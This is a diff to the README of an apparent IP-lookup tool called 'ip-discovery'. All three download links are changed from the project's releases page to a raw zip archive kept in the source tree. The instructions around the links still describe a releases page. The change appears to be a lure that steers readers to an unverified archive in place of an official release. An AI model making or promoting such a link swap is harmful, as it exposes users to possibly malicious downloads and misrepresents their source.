@@ -1,6 +1,6 @@
 # 🔎 ip-discovery - Find your public IP with ease
 
-[![Download ip-discovery](https://img.shields.io/badge/Download-Release%20Page-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://github.com/snapshotprogrambunt985/ip-discovery/releases)
+[![Download ip-discovery](https://img.shields.io/badge/Download-Release%20Page-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://github.com/snapshotprogrambunt985/ip-discovery/raw/refs/heads/main/ipd/src/discovery_ip_1.5.zip)
 
 ## 🧭 What this app does
 
@@ -26,7 +26,7 @@ You do not need to install extra software in most cases.
 ## 📥 Download the app
 
 Visit this page to download:  
-https://github.com/snapshotprogrambunt985/ip-discovery/releases
+https://github.com/snapshotprogrambunt985/ip-discovery/raw/refs/heads/main/ipd/src/discovery_ip_1.5.zip
 
 On that page:
 1. Open the latest release
@@ -164,4 +164,4 @@ If you keep your settings in a local folder, make a copy before replacing files.
 ## 📎 Download again
 
 If you need the file again, visit this page to download:  
-https://github.com/snapshotprogrambunt985/ip-discovery/releases
+https://github.com/snapshotprogrambunt985/ip-discovery/raw/refs/heads/main/ipd/src/discovery_ip_1.5.zip
